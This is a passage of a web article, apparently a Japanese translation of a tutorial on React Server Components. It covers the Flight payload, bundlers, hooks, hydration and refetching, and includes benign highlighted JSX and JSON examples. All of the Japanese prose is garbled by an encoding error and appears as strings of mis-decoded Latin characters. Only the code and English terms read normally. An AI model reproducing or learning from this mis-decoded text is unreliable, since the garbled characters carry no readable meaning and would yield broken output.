<span class="token keyword">import</span> Counter <span class="token keyword">from</span> <span class="token string">"./components/Counter"</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> DelayedMessage <span class="token keyword">from</span> <span class="token string">"./components/DelayedMessage"</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> Suspense <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"react"</span><span class="token punctuation">;</span>

<span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token keyword">function</span> <span class="token function">Home</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token punctuation">(</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>main</span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span><span class="token plain-text">understandingreact.com</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">Counter</span></span><span class="token punctuation">></span></span><span class="token plain-text">
        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token plain-text">Server Text</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token class-name">Counter</span></span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">Suspense</span></span> <span class="token attr-name">fallback</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token plain-text">Loading...</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token punctuation">}</span></span><span class="token punctuation">></span></span><span class="token plain-text">
        </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">DelayedMessage</span></span> <span class="token punctuation">/></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token class-name">Suspense</span></span><span class="token punctuation">></span></span><span class="token plain-text">
    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>main</span><span class="token punctuation">></span></span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p><code class="language-text">Counter</code>é–¢æ•°ã¯ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆä¸Šã§å®Ÿè¡Œã•ã‚Œã€ã“ã®ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã«æ¸¡ã•ã‚ŒãŸå­<code class="language-text">ï¼ˆ&lt;p>Server Text&lt;/p>ï¼‰</code>ã¯ã‚µãƒ¼ãƒãƒ¼ä¸Šã§å‡¦ç†ã•ã‚Œã¾ã™ãŒã€å•é¡Œãªãæ©Ÿèƒ½ã—ã¾ã™ã€‚</p>
<p>ãªãœæ©Ÿèƒ½ã™ã‚‹ã®ã‹ã¨è¨€ã†ã¨ã€å®Ÿè¡Œã™ã‚‹Server Componentã‚³ãƒ¼ãƒ‰ã§ã¯ãªãã€ä»®æƒ³DOMãƒ„ãƒªãƒ¼ã®ä¸€éƒ¨ï¼ˆã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã—ãŸçµæœï¼‰ã‚’æ¸¡ã—ã¦ã„ã‚‹ã‹ã‚‰ã§ã™ã€‚</p>
<p>Payloadã¯ä»¥ä¸‹ã®ã‚ˆã†ã«ãªã‚Šã¾ã™ã€‚</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token punctuation">{</span>
   <span class="token string-property property">"children"</span><span class="token operator">:</span> <span class="token punctuation">[</span>
    <span class="token punctuation">{</span>
     <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"h1"</span><span class="token punctuation">,</span>
     <span class="token string-property property">"key"</span><span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">,</span>
     <span class="token string-property property">"props"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
      <span class="token string-property property">"children"</span><span class="token operator">:</span> <span class="token string">"understandingreact.com"</span>
     <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">{</span>
     <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
      <span class="token string-property property">"$$type"</span><span class="token operator">:</span> <span class="token string">"reference"</span><span class="token punctuation">,</span>
      <span class="token string-property property">"id"</span><span class="token operator">:</span> <span class="token string">"d"</span><span class="token punctuation">,</span>
      <span class="token string-property property">"identifier"</span><span class="token operator">:</span> <span class="token string">"L"</span><span class="token punctuation">,</span>
      <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"Lazy node"</span>
     <span class="token punctuation">}</span><span class="token punctuation">,</span>
     <span class="token string-property property">"key"</span><span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">,</span>
     <span class="token string-property property">"props"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
      <span class="token string-property property">"children"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
       <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"p"</span><span class="token punctuation">,</span>
       <span class="token string-property property">"key"</span><span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">,</span>
       <span class="token string-property property">"props"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token string-property property">"children"</span><span class="token operator">:</span> <span class="token string">"Server Text"</span>
       <span class="token punctuation">}</span>
      <span class="token punctuation">}</span>
     <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token punctuation">{</span>
     <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
      <span class="token string-property property">"$$type"</span><span class="token operator">:</span> <span class="token string">"reference"</span><span class="token punctuation">,</span>
      <span class="token string-property property">"id"</span><span class="token operator">:</span> <span class="token string">"e"</span><span class="token punctuation">,</span>
      <span class="token string-property property">"identifier"</span><span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">,</span>
      <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"Reference"</span>
     <span class="token punctuation">}</span><span class="token punctuation">,</span>
     <span class="token string-property property">"key"</span><span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">,</span>
     <span class="token string-property property">"props"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
      <span class="token string-property property">"fallback"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
       <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"p"</span><span class="token punctuation">,</span>
       <span class="token string-property property">"key"</span><span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">,</span>
       <span class="token string-property property">"props"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
        <span class="token string-property property">"children"</span><span class="token operator">:</span> <span class="token string">"Loading..."</span>
       <span class="token punctuation">}</span>
      <span class="token punctuation">}</span><span class="token punctuation">,</span>
      <span class="token string-property property">"children"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
       <span class="token string-property property">"$$type"</span><span class="token operator">:</span> <span class="token string">"reference"</span><span class="token punctuation">,</span>
       <span class="token string-property property">"id"</span><span class="token operator">:</span> <span class="token string">"f"</span><span class="token punctuation">,</span>
       <span class="token string-property property">"identifier"</span><span class="token operator">:</span> <span class="token string">"L"</span><span class="token punctuation">,</span>
       <span class="token string-property property">"type"</span><span class="token operator">:</span> <span class="token string">"Lazy node"</span>
      <span class="token punctuation">}</span>
     <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
   <span class="token punctuation">]</span>
  <span class="token punctuation">}</span>
 <span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<p>Payloadã®"Server Text"ã®éƒ¨åˆ†ã«æ³¨ç›®ã—ã¦ãã ã•ã„ã€‚ã™ã§ã«propsã¨ã—ã¦Client Componentã«æ¸¡ã•ã‚Œã¦ã„ã¾ã™ã€‚Client Componentã§ç›´æ¥Payloadã«JSXã‚’æ›¸ã„ãŸã®ã¨å¤‰ã‚ã‚Šã¾ã›ã‚“ã€‚</p>
<h2>ãƒãƒ³ãƒ‰ãƒ©ï¼šç¸ã®ä¸‹ã®åŠ›æŒã¡</h2>
<p>ã“ã‚Œã‚‰ã¯å…¨ã¦ã‚ã‚‹é‡è¦ãªç‚¹ã‚’ç¤ºã—ã¦ã„ã¾ã™ã€‚<strong>React Server Componentsã¯ã€å¤šãã®ç‚¹ã«ãŠã„ã¦ãƒãƒ³ãƒ‰ãƒ©æ©Ÿèƒ½ã ã¨ã„ã†ã“ã¨ã§ã™</strong>ã€‚</p>
<p>ãƒãƒ³ãƒ‰ãƒ©ã¯ã‚³ãƒ¼ãƒ‰ã‚’åˆ†æã—ã€Clientã€€ComponentsãŒãƒãƒ³ãƒ‰ãƒ«ã«å«ã¾ã‚Œã¦ã„ã‚‹ã“ã¨ã‚’ç¢ºèªã—ã€Client Componentsã¸ã®ãƒªãƒ•ã‚¡ãƒ¬ãƒ³ã‚¹ãŒPayloadã«é©åˆ‡ã«å«ã¾ã‚Œã‚‹ã‚ˆã†ã«ã—ã¾ã™ã€‚</p>
<p>ãƒãƒ³ãƒ‰ãƒ©ã¯Reactã«æ¬ ã‹ã›ãªã„å­˜åœ¨ã§ã™ã€‚Reactã®ã‚³ãƒ¼ãƒ‰ãƒ™ãƒ¼ã‚¹ã‚’è¦‹ã‚‹ã¨ã€ä»¥ä¸‹ã®ã‚ˆã†ãªãƒ•ã‚©ãƒ«ãƒ€ãŒã‚ã‚Šã¾ã™ã€‚</p>
<div class="gatsby-highlight" data-language="text"><pre style="counter-reset: linenumber NaN" class="language-text line-numbers"><code class="language-text">/react-server-dom-parcel
/react-server-dom-turbopack
/react-server-dom-webpack
//...and more</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span></span></pre></div>
<p>ã“ã‚Œã‚‰ã®ãƒ•ã‚©ãƒ«ãƒ€ã®ä¸­ã«ã¯Flighté–¢é€£ã®ã‚³ãƒ¼ãƒ‰ãŒå«ã¾ã‚Œã¦ãŠã‚Šã€ãƒãƒ³ãƒ‰ãƒ«ã•ã‚ŒãŸã‚³ãƒ¼ãƒ‰ãŒé©åˆ‡ã«å®Ÿè¡Œã•ã‚Œã‚‹ã‚ˆã†ã«ã—ã¾ã™ã€‚</p>
<p>ãƒãƒ³ãƒ‰ãƒ©ãŒRSCã«ãŠã„ã¦è„‡å½¹çš„ãªå­˜åœ¨ã§ã‚ã‚‹ã¨ã„ã†ã“ã¨ã¯ã€ä»–ã®æ–¹æ³•ã‚‚å¯èƒ½ã ã¨ã„ã†ã“ã¨ã§ã™ã€‚ãƒ¡ã‚¿ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã¯ã€Next.jsãŒä½¿ç”¨ã™ã‚‹<code class="language-text">use client</code>ã®ã‚¢ãƒ—ãƒ­ãƒ¼ãƒã‚’å—ã‘å…¥ã‚Œã‚‹å¿…è¦ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚ä¾‹ãˆã°ã€<a href="https://tanstack.com/start/">TanStack Start</a>ã¯å˜ã«ã€ŒJSXã‚’è¿”ã™ã€ï¼ˆFlightå½¢å¼ï¼‰é–¢æ•°ã¨ã—ã¦RSCã‚’å®Ÿè£…ã—ã¦ã„ã¾ã™ã€‚</p>
<p>Reactã¯ã€Flightãƒ‡ãƒ¼ã‚¿ã®ã‚¹ãƒˆãƒªãƒ¼ãƒŸãƒ³ã‚°ã¨ã„ã†APIã‚’æä¾›ã—ã¦ã„ã¾ã™ã€‚ãƒ¡ã‚¿ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã¯ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‚¢ãƒƒãƒ—ã‚’è¡Œã„ã€ãã®APIã‚’å·¥å¤«ã—ã¦ä½¿ã†ã“ã¨ãŒã§ãã¾ã™ã€‚</p>
<h2>ãƒ•ãƒƒã‚¯ã¨RSC</h2>
<p>ã‚µãƒ¼ãƒãƒ¼ä¸Šã§å®Ÿè¡Œã™ã‚‹ã“ã¨ã«ã¯ãƒ¡ãƒªãƒƒãƒˆã‚‚ã‚ã‚Šã¾ã™ãŒã€åˆ¶ç´„ã‚‚ã‚ã‚Šã¾ã™ã€‚
Reactã¯ã€å„è¦ç´ ã®æ§‹é€ ã‚’ä»®æƒ³DOMã«æ ¼ç´ã™ã‚‹ã ã‘ã§ã¯ãªãã€stateã‚’æ ¼ç´ã—ã¾ã™ã€‚ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã«ä»¥ä¸‹ã®ã‚ˆã†ã«æ›¸ãã¨ã—ã¾ã™ã€‚</p>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token keyword">const</span> <span class="token punctuation">[</span>counter<span class="token punctuation">,</span> setCounter<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span></span></pre></div>
<p>ãã†ã™ã‚‹ã¨ã€ä»®æƒ³DOMã«ãŠã‘ã‚‹ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã®å ´æ‰€ã«ç´ã¥ã‘ã‚‰ã‚ŒãŸé€£çµãƒªã‚¹ãƒˆä¸Šã®ãƒãƒ¼ãƒ‰ã«ãƒ‡ãƒ¼ã‚¿ãŒç½®ã‹ã‚Œã¾ã™ã€‚å®Ÿéš›ã«ã¯ã€ãã®stateã¯ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã®ãƒ–ãƒ©ã‚¦ã‚¶ã®ãƒ¡ãƒ¢ãƒªä¸Šã«ã‚ã‚‹JavaScriptã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã®ä¸­ã«ã‚ã‚Šã¾ã™ã€‚</p>
<p>ã—ãŸãŒã£ã¦ã€React Server Componentsã¯ã€ãã®æ€§è³ªä¸Šã“ã‚Œã‚‰ã®ãƒ•ãƒƒã‚¯ã‚’åˆ©ç”¨ã§ãã¾ã›ã‚“ã€‚ãƒ•ãƒƒã‚¯ã‚’åˆ©ç”¨ã§ãã‚‹ç’°å¢ƒã§å®Ÿè¡Œã•ã‚Œã¦ã„ãªã„ã®ã§ã™ã€‚</p>
<p>ã¤ã¾ã‚Šã€RSCã¯ã€Œéã‚¤ãƒ³ã‚¿ãƒ©ã‚¯ãƒ†ã‚£ãƒ–ã€ã ã¨ã„ã†ã“ã¨ã§ã™ã€‚Reactã«ãŠã‘ã‚‹ã‚¤ãƒ³ã‚¿ãƒ©ã‚¯ãƒ†ã‚£ãƒ“ãƒ†ã‚£ã¨ã¯ã€ä¸€èˆ¬çš„ã«ã¯ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆå´ã®Reactã«ã‚ˆã‚‹å†ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã‚’ã€stateã®æ›´æ–°ã«ã‚ˆã£ã¦ãƒˆãƒªã‚¬ãƒ¼ã™ã‚‹ã“ã¨ã‚’æ„å‘³ã—ã¾ã™ã€‚</p>
<p>ãã®ãŸã‚ã€ã‚¢ãƒ—ãƒªã®ã‚¤ãƒ³ã‚¿ãƒ©ã‚¯ãƒ†ã‚£ãƒ–æ©Ÿèƒ½ãŒå¢—ãˆã‚‹ã«ã¤ã‚Œã€Serverã€€Componentsã‚’Client Componentã¨Server Componentã®ã‚³ãƒ³ãƒã‚¸ã‚·ãƒ§ãƒ³ã«çµ„ã¿æ›¿ãˆã‚‹ã‚ˆã†ã«ãªã‚Šã¾ã™ã€‚</p>
<p><code class="language-text">useReducer</code>ã‚„<code class="language-text">useState</code>ãªã©ãŒå¿…è¦ãªå ´åˆã¯ã€Client ComponentãŒå¿…è¦ã«ãªã‚Šã¾ã™ã€‚</p>
<p>ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆãŒã©ã“ã§å®Ÿè¡Œã•ã‚Œã‚‹ã®ã‹ã‚’å¿µé ­ã«ç½®ã„ã¦ãŠãã¨ã€ãƒ•ãƒƒã‚¯ã‚’é©åˆ‡ã«ä½¿ç”¨ã™ã‚‹ï¼ˆã¾ãŸã¯ä½¿ç”¨ã—ãªã„ï¼‰ã“ã¨ãŒã§ãã¾ã™ã€‚</p>
<h2>ãƒã‚¤ãƒ‰ãƒ¬ãƒ¼ãƒˆã™ã‚‹ã‹å¦ã‹</h2>
<p>ã‚ˆãèª¤è§£ã•ã‚Œã‚‹ç‚¹ã«ã¤ã„ã¦å°‘ã—ãŠè©±ã—ã—ãŸã„ã¨æ€ã„ã¾ã™ã€‚RSCã¯ãƒã‚¤ãƒ‰ãƒ¬ãƒ¼ãƒˆã™ã‚‹ã®ã‹ã€ã¨ã„ã†ç‚¹ã«ã¤ã„ã¦ã§ã™ã€‚</p>
<p>ç­”ãˆã¯å¦ã§ã™ã€‚ãƒã‚¤ãƒ‰ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ã¨ã¯ã€ã‚¤ãƒ™ãƒ³ãƒˆã‚’ãƒãƒ³ãƒ‰ãƒ©ã«ãƒ•ãƒƒã‚¯ã§ãã‚‹ã‚ˆã†ä»®æƒ³DOMã‚’æ§‹ç¯‰ã™ã‚‹ãŸã‚ã«ã€å®Ÿéš›ã®é–¢æ•°ã‚’ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆä¸Šã§å†å®Ÿè¡Œã™ã‚‹ã“ã¨ã§ã™ã€‚</p>
<p>Reactã§ã¯ã€ãƒœã‚¿ãƒ³ã‚’ã‚¯ãƒªãƒƒã‚¯ã™ã‚‹ã¨ã€ãã®ã‚¤ãƒ™ãƒ³ãƒˆã¯DOMãƒ„ãƒªãƒ¼ã®æœ€ä¸Šéƒ¨ã«ã‚ã‚‹Reactã®ãƒ«ãƒ¼ãƒˆã¾ã§é€ã‚‰ã‚Œã€ã©ã®ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆãŒã‚¯ãƒªãƒƒã‚¯ã‚’å‡¦ç†ã™ã‚‹ã‹ã‚’ReactãŒåˆ¤æ–­ã—ã¾ã™ï¼ˆç­”ãˆã¯ã€ãƒœã‚¿ãƒ³ã®ä½œæˆã«é–¢ã‚ã£ãŸã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã§ã™ï¼‰ã€‚</p>
<p>ã—ãŸãŒã£ã¦ã€ReactãŒã‚¤ãƒ™ãƒ³ãƒˆã«é©åˆ‡ã«å¯¾å¿œã§ãã‚‹ã‚ˆã†ã€ä»®æƒ³DOMã¨ã€ã‚¯ãƒªãƒƒã‚¯ã‚’å‡¦ç†ã™ã‚‹ã‚³ãƒ¼ãƒ‰ãŒãªãã¦ã¯ã„ã‘ã¾ã›ã‚“ã€‚
RSCã¯éã‚¤ãƒ³ã‚¿ãƒ©ã‚¯ãƒ†ã‚£ãƒ–ã§ã™ã€‚å°‘ãªãã¨ã‚‚Reactã®é€šå¸¸ã®ã‚¢ãƒ—ãƒ­ãƒ¼ãƒã§ã¯ã€stateã®è¨­å®šã‚‚ã€ã‚¯ãƒªãƒƒã‚¯ã®å‡¦ç†ã‚‚è¡Œã„ã¾ã›ã‚“ã€‚å®Ÿè¡Œã™ã‚‹ãŸã‚ã«ã‚³ãƒ¼ãƒ‰ã‚’ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã«é€ã‚‹ã“ã¨ã‚‚ãªã„ã®ã§ã€å½“ç„¶ãªãŒã‚‰ãƒã‚¤ãƒ‰ãƒ¬ãƒ¼ãƒˆã—ã¾ã›ã‚“ã€‚</p>
<p>ã—ã‹ã—ã€ä»®æƒ³DOMã®æ§‹ç¯‰ã«ã¯é–¢ã‚ã£ã¦ã„ã¾ã™ã€‚ãƒ„ãƒªãƒ¼ã®å·®åˆ†æ¤œå‡ºå‡¦ç†ã«ã‚‚é–¢ã‚ã£ã¦ã„ã¾ã™ã€‚ãƒã‚¤ãƒ‰ãƒ¬ãƒ¼ãƒˆã—ãªã„ã‹ã‚‰ã¨è¨€ã£ã¦ã€ãƒã‚¤ãƒ‰ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³æ™‚ã«ãƒ„ãƒªãƒ¼ä¸Šã«å­˜åœ¨ã—ãªã„ã‚ã‘ã§ã¯ã‚ã‚Šã¾ã›ã‚“ã€‚å­˜åœ¨ã—ã¾ã™ã€‚</p>
<h2>å†ãƒ•ã‚§ãƒƒãƒã¨å·®åˆ†æ¤œå‡º</h2>
<p>å®Ÿéš›ã®ã‚¢ãƒ—ãƒªã§ã¯ã€ãƒšãƒ¼ã‚¸ã®åˆå›ãƒ­ãƒ¼ãƒ‡ã‚£ãƒ³ã‚°ã ã‘ã§ãªãã€ã‚µãƒ¼ãƒãƒ¼ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã®å†ãƒ•ã‚§ãƒƒãƒã«ã¤ã„ã¦ã‚‚è€ƒãˆã‚‹å¿…è¦ãŒã‚ã‚‹ã§ã—ã‚‡ã†ã€‚</p>
<p>ã¤ã¾ã‚Šã€ã‚µãƒ¼ãƒãƒ¼ã«ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆï¼ˆå ´åˆã«ã‚ˆã£ã¦ã¯æ–°ã—ã„propsã‚’å«ã‚€ï¼‰ã‚’å†å®Ÿè¡Œã™ã‚‹ã‚ˆã†æŒ‡ç¤ºã—ã€ä»®æƒ³DOMã‚’æ›´æ–°ã™ã‚‹ãŸã‚ã«æ–°ã—ã„Payloadãƒ‡ãƒ¼ã‚¿ã‚’é€ã£ã¦ã‚‚ã‚‰ã†ã¨ã„ã†ã“ã¨ã§ã™ã€‚</p>
<p>ä¾‹ãˆã°ã€RSCãŒç”Ÿæˆã—ãŸãƒ‡ãƒ¼ã‚¿ãƒªã‚¹ãƒˆã«ãƒšãƒ¼ã‚¸ç•ªå·ã‚’ä»˜ã‘ã¦ã„ãå ´åˆã€ãƒ«ãƒ¼ãƒˆãŒ<code class="language-text">/page/1</code>ã‹<code class="language-text">/page/2</code>ã§ã‚ã‚‹ã‹ã«ã‚ˆã£ã¦ã€ç•°ãªã‚‹ãƒ‡ãƒ¼ã‚¿ã‚»ãƒƒãƒˆã‚’å–å¾—ã™ã‚‹ã“ã¨ãŒæœ›ã¾ã‚Œã¾ã™ã€‚</p>
<p>ã“ã‚Œã¯RSCã®åˆ©ç‚¹ã§ã‚ã‚Šã€ãŠãã‚‰ããƒ¡ã‚¿ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã®ãƒ«ãƒ¼ã‚¿ãƒ¼ã«çµ„ã¿è¾¼ã¾ã‚Œã¦ã„ã¾ã™ã€‚UIã¯ã‚µãƒ¼ãƒãƒ¼ä¸Šã§è¨ˆç®—ã•ã‚Œã¾ã™ãŒã€ãƒ¡ã‚¿ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã¯ãƒšãƒ¼ã‚¸å…¨ä½“ã‚’å†åº¦èª­ã¿è¾¼ã‚€å¿…è¦ãŒã‚ã‚Šã¾ã›ã‚“ã€‚</p>
<p>RSCã¯ãã®æ€§è³ªä¸Šã€ä»®æƒ³DOMã®å®šç¾©ã‚’ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã«ã‚¹ãƒˆãƒªãƒ¼ãƒŸãƒ³ã‚°ã™ã‚‹ã“ã¨ãŒã§ãã€Reactã¯é€šå¸¸ã©ãŠã‚Šã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆå´ã§å·®åˆ†æ¤œå‡ºå‡¦ç†ã‚’è¡Œã†ã“ã¨ãŒã§ãã¾ã™ã€‚ã¤ã¾ã‚Šã€ãƒšãƒ¼ã‚¸ã‚’å†åº¦èª­ã¿è¾¼ã‚€å¿…è¦ãŒãªãã€ãƒšãƒ¼ã‚¸ä¸Šã®ä»–ã®stateã‚‚å¤±ã‚ã‚Œã¾ã›ã‚“ã€‚</p>
<p>ã“ã®ç‚¹ã«ãŠã„ã¦ã€RSCã¯ã‚µãƒ¼ãƒãƒ¼ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã¨ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã®ä¸¡æ–¹ã®é•·æ‰€ã‚’æä¾›ã§ãã¾ã™ã€‚ã‚µãƒ¼ãƒãƒ¼ä¸Šã§å®Ÿè¡Œã—ãªãŒã‚‰ã€ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆä¸Šã§å®Ÿè¡Œã•ã‚ŒãŸå ´åˆã¨åŒã˜ã‚ˆã†ã«æ›´æ–°ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™
ã€‚
RSCã®ä»•çµ„ã¿ã«ã¤ã„ã¦èª¬æ˜ã—ã¾ã—ãŸã®ã§ã€ã‚ˆã‚Šç›´æ„Ÿçš„ã«ã”ç†è§£ã„ãŸã ã‘ã‚‹ã®ã§ã¯ãªã„ã‹ã¨æ€ã„ã¾ã™ã€‚Reactã¯ã™ã§ã«ä»®æƒ³DOMã®å·®åˆ†è¨ˆç®—ã«ã‚ˆã£ã¦DOMã‚’æ›´æ–°ã—ã¦ã„ã¾ã™ã®ã§ã€ä»®æƒ³DOMã®ãƒ‡ãƒ¼ã‚¿ã‚’ã‚µãƒ¼ãƒãƒ¼ã‹ã‚‰å–å¾—ã§ãã‚Œã°ã€Reactã¯é€šå¸¸ã®å‹•ä½œã‚’è¡Œã†ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚</p>
<h2>ãƒãƒ³ãƒ‰ãƒ«ã‚µã‚¤ã‚ºã«é–¢ã™ã‚‹èª¤è§£</h2>
<p>10å¹´ä»¥ä¸Šå‰ã‹ã‚‰ã€ä½¿ç”¨ã™ã‚‹ãƒ„ãƒ¼ãƒ«ã®ä»•çµ„ã¿ã‚’æ·±ãç†è§£ã™ã‚‹ã“ã¨ã®é‡è¦æ€§ã‚’èª¬ã„ã¦ãã¾ã—ãŸã€‚<a href="https://tonyalicea.dev/courses">ç­†è€…ã®ã‚³ãƒ¼ã‚¹</a>ã§ã¯ã€ä¸€è²«ã—ã¦ã“ã®ãƒ†ãƒ¼ãƒã«ã¤ã„ã¦æ‰±ã£ã¦ãã¾ã—ãŸã€‚</p>
<p>å¤šãã®ç”Ÿå¾’ãŒã“ã®ã‚¢ãƒ—ãƒ­ãƒ¼ãƒã®é‡è¦æ€§ã‚’ç†è§£ã—ã¦ãã‚Œã¦ã„ã¾ã™ãŒã€ã€Œç†è«–ãŒå¤šã™ãã‚‹ã€‚å®Ÿè·µã‹ã‚‰å­¦ã¹ã°ã„ã„ã€ã¨ä¸æº€ã‚’æ¼ã‚‰ã™ç”Ÿå¾’ã‚‚ãŸã¾ã«ã„ã¾ã™ã€‚</p>
<p>ã—ã‹ã—ã€ä½¿ç”¨ã™ã‚‹ãƒ„ãƒ¼ãƒ«ã‚„ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã€ãƒ•ãƒ¬ãƒ¼ãƒ ãƒ¯ãƒ¼ã‚¯ã®ä»•çµ„ã¿ã‚’ç†è§£ã™ã‚‹ã“ã¨ã®ä¸»ãªä¾¡å€¤ã®ä¸€ã¤ãŒã€æ­£ç¢ºãªæƒ…å ±ã«åŸºã¥ãã€ã‚¢ãƒ¼ã‚­ãƒ†ã‚¯ãƒãƒ£ã«é–¢ã™ã‚‹åŠ¹æœçš„ãªåˆ¤æ–­ãŒã§ãã‚‹ã“ã¨ã§ã™ã€‚</p>
